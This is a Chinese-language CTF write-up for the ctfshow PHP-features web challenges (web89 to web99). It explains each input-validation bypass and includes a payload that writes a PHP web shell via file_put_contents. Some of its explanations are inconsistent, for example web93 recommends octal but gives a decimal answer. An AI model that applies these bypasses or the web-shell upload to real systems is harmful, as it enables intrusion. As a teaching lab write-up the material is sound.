## ctfshow- PHP特性

[TOC]

### web89

```php
if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
```

需要绕过`preg_match`,利用数组绕过

> `preg_match()`当检测的变量是数组的时候,会报错并返回0。
>
> `intval()`函数转换数组的时候
>
> - 有数据返回 1
> - 没数据返回 0 

```python
?num[]=1
```



### web90

```php
if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
```

`===` 强判断，会判断类型，所以传非整数类型即可

```
pj?num=4476a
?num=4476.0
```

> 看文档还可以使用  八进制或者十六进制绕过



### web91

```php
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
```

`/^php$/im` ,这个涉及到正则表达式

- `i` 也是**忽略大小写**标志
- `m` 是**多行模式**（multiline）标志。它的作用是在处理多行文本时，每一行都被看作独立的字符串。在这种模式下，`^` 和 `$` 会分别匹配每一行的开头和结尾，而不仅仅是整个文本的开头和结尾。

第一个多行匹配，第二个是只匹配第一行

我们就可以令第一行随意东西，第二行出现`php`就行

```
?cmd = php%0Aphp
?cmd = %0Aphp
```



### web92

```php
   $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
```

这个跟上上一题很一样，只是这个是弱比较,这里我们可以利用进制绕过

```Python
?num=0x117c
#小数点也可以
?num = 4476.1
```



### web93

```php
$num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
```

这里ban了字母,使用不了16进制，可以使用8进制

```
?num=4476.1
```



### web94

```php
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
```

`strpos()`返回目标第一次出现的位置，所以不能让0出现在第一位置，但0也得出现，八进制不能使用

```python
?num=4476.01
```



### web95

```php
$num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
```

与上一题比较发现，`.`也被过滤了

> 文档：可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574

```
?num=+010574
```



### web96

```php
if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
```

这个题不能等于`flag.php`

```Python
?u=./flag.php
?u=/var/www/html/flag.php
#还可以使用类似文件包含的语句
```



### web97

```php
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
```

md5相关内容了，这里直接使用数组绕过了



### web98

```php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
```



### web99

```php
$allow = array();   //新建一个数组
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i)); //相当于入栈
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
```

看了一下官方文档讲解：

`rand()`函数

> ```
> rand(min, max)
> ```
>
> - **min**（可选）：指定随机数的最小值。默认是 `0`。
> - **max**（可选）：指定随机数的最大值。默认是 `getrandmax()` 返回的最大值，通常是

`in_array`函数

> `in_array`(PHP 4, PHP 5, PHP 7, PHP 8)
>
> `in_array` — 检查数组中是否存在某个值
>
> 说明[ ¶](https://www.php.net/manual/zh/function.in-array.php#refsect1-function.in-array-description)
>
> in_array([mixed](https://www.php.net/manual/zh/language.types.mixed.php) `$needle`, [array](https://www.php.net/manual/zh/language.types.array.php) `$haystack`, [bool](https://www.php.net/manual/zh/language.types.boolean.php) `$strict` = **`false`**): [bool](https://www.php.net/manual/zh/language.types.boolean.php)
>
> 大海捞针，在大海（`haystack`）中搜索针（ `needle`），如果没有设置 `strict` 则使用宽松的比较。

最后就是`file_put_contents()`函数

> `file_put_contents()` 函数把一个字符串写入文件中。 如果文件不存在，将创建一个文件 如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。

做的一个小测试，数据量不小，所以大概率不太夸张的数字都可以使用

![image-20240909215336744](https://gitee.com/bx33661/image/raw/master/path/image-20240909215336744.png)

```python
?n=83.php
content=<?php system("ls");?>
```



#### 补充

学习了之后发现：

```php
var_dump(in_array('1abc', [1,2,3])); 
// true
var_dump(in_array('abc', [1,2,3])); 
// false
var_dump(in_array('abc', [0,1,2,3])); 
/ true
```

**`var_dump(in_array('1abc', [1,2,3])); // true`**

- `'1abc'` 是一个字符串，但 PHP 会在进行松散比较时尝试将字符串转换为数字。在这种情况下，字符串 `'1abc'` 被转换为整数 `1`，因为 PHP 从字符串的第一个字符开始，直到遇到无法解析为数字的字符。
- 因为 `1` 存在于数组 `[1, 2, 3]` 中，比较结果为 `true`。

**`var_dump(in_array('abc', [1,2,3])); // false`**

- `'abc'` 是一个完全由非数字字符组成的字符串。在松散比较中，PHP 会尝试将其转换为整数，但 `'abc'` 被转换为 `0`。
- 数组 `[1, 2, 3]` 中不包含 `0`，因此结果是 `false`。

**`var_dump(in_array('abc', [0,1,2,3])); // true`**

- 同样地，字符串 `'abc'` 被转换为 `0`。
- 因为数组 `[0, 1, 2, 3]` 中包含 `0`，比较结果为 `true`。





### xjb

#### 进制转化

```python
# 定义一个函数，将给定进制的数字转换为十进制
def to_decimal(number: str, base: int) -> int:
    return int(number, base)


# 定义一个函数，将十进制数字转换为目标进制
def from_decimal(number: int, base: int) -> str:
    if number == 0:
        return "0"

    digits = []
    while number:
        digits.append(int(number % base))
        number //= base
    digits = digits[::-1]  # 反转列表
    return ''.join([str(digit) for digit in digits])


# 定义主函数，进行进制转换
def convert_base(number: str, from_base: int, to_base: int) -> str:
    decimal_number = to_decimal(number, from_base)  # 转为十进制
    return from_decimal(decimal_number, to_base)  # 从十进制转为目标进制


# 测试脚本
if __name__ == "__main__":
    # 输入数字和进制
    number = input("请输入要转换的数字: ")
    from_base = int(input("请输入数字的原始进制: "))
    to_base = int(input("请输入目标进制: "))

    # 进行进制转换
    result = convert_base(number, from_base, to_base)

    # 打印结果
    print(f"{number} 从 {from_base} 进制转换为 {to_base} 进制的结果是: {result}")
```

